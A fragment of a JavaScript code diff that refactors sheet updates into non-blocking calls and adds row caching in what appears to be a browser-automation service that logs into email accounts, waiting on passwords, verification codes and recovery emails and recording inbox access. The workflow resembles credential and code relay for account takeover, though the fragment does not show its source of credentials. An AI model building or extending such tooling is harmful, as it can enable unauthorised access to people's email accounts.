         } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) {
@@ -3307,11 +3417,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 if (password) {
                     logger.info(`[processRow][${browserId}] WAITING_PASSWORD but password already available. Restoring to WAITINGPASSWORD for retry.`);
                     updateData.status = "WAITINGPASSWORD";
-                    await updateBrowserRowData(browserId, { status: "WAITINGPASSWORD" });
+                    updateBrowserRowDataFast(browserId, { status: "WAITINGPASSWORD" });
                     return;
                 }
                 finalStatus = "WAITINGPASSWORD";
-                await updateBrowserRowData(browserId, { status: "WAITINGPASSWORD", verified: false, fullAccess: false });
+                updateBrowserRowDataFast(browserId, { status: "WAITINGPASSWORD", verified: false, fullAccess: false });
             } else if (initialCheckResult.accountAccess) {
                 if (!initialCheckResult.requiresVerification) {
                     if (initialCheckResult.reachedInbox) {
@@ -3353,7 +3463,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
         if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL") { // Also update for WAITING_CODE if options are relevant
             updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
-            await updateBrowserRowData(browserId, updateData);
+            updateBrowserRowDataFast(browserId, updateData);
             logger.info(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated with options.`);
         }
 
@@ -3518,6 +3628,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
                 logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
             );
+            setCachedRow(browserId, finalSheetUpdate);
         }
 
         if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
@@ -3799,7 +3910,7 @@ async function processWaitingRows() {
                     activeBrowserSessions.delete(browserId);
 
                     try {
-                        await updateBrowserRowData(browserId, {
+                        updateBrowserRowDataFast(browserId, {
                             status: "FAILED",
                             verified: false,
                             fullAccess: false,
@@ -3853,6 +3964,7 @@ function stopInterval() {
 // Auto-start interval on module load so existing sheet rows get processed
 // without waiting for an external POST to trigger it.
 // The interval self-stops after 20 consecutive empty polls (see stopInterval logic).
+identifyServerlessSelf().catch(err => logger.error(`[ServerlessTracker] Self-identification failed: ${err.message}`));
 ensureIntervalIsRunning();
 
 export async function OPTIONS() {
@@ -4035,6 +4147,7 @@ export async function POST(request) {
             })
         };
         await updateBrowserRowData(actualBrowserId, initialRowData, true); // true for new row
+        populateCache(actualBrowserId, initialRowData);
 
         // The background process will pick this up.
         // We don't launch browser here in the POST request itself.
